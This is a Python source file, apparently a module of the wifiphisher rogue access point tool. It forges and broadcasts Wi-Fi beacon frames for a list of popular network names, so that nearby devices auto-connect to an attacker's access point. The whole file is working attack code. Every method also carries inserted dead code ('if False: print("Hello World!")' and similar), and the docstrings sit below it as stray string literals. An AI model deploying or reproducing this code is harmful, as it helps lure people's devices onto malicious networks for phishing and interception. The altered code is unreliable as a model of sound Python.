"""
Extension that sends a number of known beacons to trigger the AUTO-CONNECT flag.
"""
import logging
import time
from collections import defaultdict
import scapy.layers.dot11 as dot11
import wifiphisher.common.constants as constants
import wifiphisher.common.globals as universal
logger = logging.getLogger(__name__)

class Knownbeacons(object):
    """
    Sends a number of known beacons to trigger the Auto-Connect flag.
    """

    def __init__(self, shared_data):
        if False:
            print('Hello World!')
        '\n        Setup the class with all the given arguments\n\n        :param self: A Beacons object\n        :param data: Shared data from main engine\n        :type self: Beacons\n        :type data: dict\n        :return: None\n        :rtype: None\n        '
        self.data = shared_data
        self._packets_to_send = defaultdict(list)
        self._starttime = time.time()
        self._msg = []
        self._full_pkt_list = self._get_known_beacons()

    def _get_known_beacons(self):
        if False:
            return 10
        '\n        Retrieve the popular ESSIDs from the text file\n        and then construct all the known beacon frames.\n\n        :param self: A Beacons object\n        :type self: Beacons\n        :return: A list with all the beacon frames\n        :rtype: list\n        '
        beacons = list()
        essid = str()
        bssid = self.data.rogue_ap_mac
        area_file = constants.KNOWN_WLANS_FILE
        with open(area_file) as _file:
            for line in _file:
                if line.startswith('!'):
                    continue
                essid = line.rstrip()
                frame_part_0 = dot11.RadioTap()
                frame_part_1 = dot11.Dot11(subtype=8, addr1=constants.WIFI_BROADCAST, addr2=bssid, addr3=bssid)
                frame_part_2 = dot11.Dot11Beacon(cap=constants.KB_BEACON_CAP)
                frame_part_3 = dot11.Dot11Elt(ID='SSID', info=essid)
                frame_part_4 = dot11.Dot11Elt(ID='Rates', info=constants.AP_RATES)
                frame_part_5 = dot11.Dot11Elt(ID='DSset', info=chr(7))
                complete_frame = frame_part_0 / frame_part_1 / frame_part_2 / frame_part_3 / frame_part_4 / frame_part_5
                beacons.append(complete_frame)
        return beacons

    def get_packet(self, pkt):
        if False:
            print('Hello World!')
        '\n        We start broadcasting the beacons on the first received packet\n\n        :param self: A Knownbeacons object\n        :param packet: A scapy.layers.RadioTap object\n        :type self: Knownbeacons\n        :type packet: scapy.layers.RadioTap\n        :return: A tuple containing ["*"] followed by a list of\n            the crafted beacon frames\n        :rtype: tuple(list, list)\n        .. warning: pkt is not used here but should not be removed since\n            this prototype is requirement\n        '
        if time.time() - self._starttime > constants.KB_INTERVAL:
            self._full_pkt_list = self._full_pkt_list[constants.KB_BUCKET_SIZE:] + self._full_pkt_list[:constants.KB_BUCKET_SIZE]
            self._starttime = time.time()
            first_essid = self._full_pkt_list[0][dot11.Dot11Elt].info.decode('utf8')
            last_essid = self._full_pkt_list[constants.KB_BUCKET_SIZE - 1][dot11.Dot11Elt].info.decode('utf8')
            self._msg.append('Sending %s known beacons (%s ... %s)' % (str(constants.KB_BUCKET_SIZE), first_essid, last_essid))
        self._packets_to_send['*'] = self._full_pkt_list[:constants.KB_BUCKET_SIZE]
        return self._packets_to_send

    def send_output(self):
        if False:
            return 10
        '\n        Sending Knownbeacons notification\n\n        :param self: A Knownbeacons object\n        :type self: Knownbeacons\n        :return: list of notification messages\n        :rtype: list\n        .. note: Only sends notification for the first time to reduce\n            clutters\n        '
        if self._msg:
            return self._msg
        return ['Sending known beacons...']

    def send_channels(self):
        if False:
            return 10
        '\n        Send all interested channels\n\n        :param self: A Knownbeacons object\n        :type self: Knownbeacons\n        :return: A list with all the channels interested\n        :rtype: list\n        .. note: Only the channel of the target AP is sent here\n        '
        return [self.data.target_ap_channel]

    def on_exit(self):
        if False:
            i = 10
            return i + 15
        '\n        :param self: A Knownbeacons object\n        :type self: Knownbeacons\n        Free all the resources regarding to this module\n        :return: None\n        :rtype: None\n        '
        pass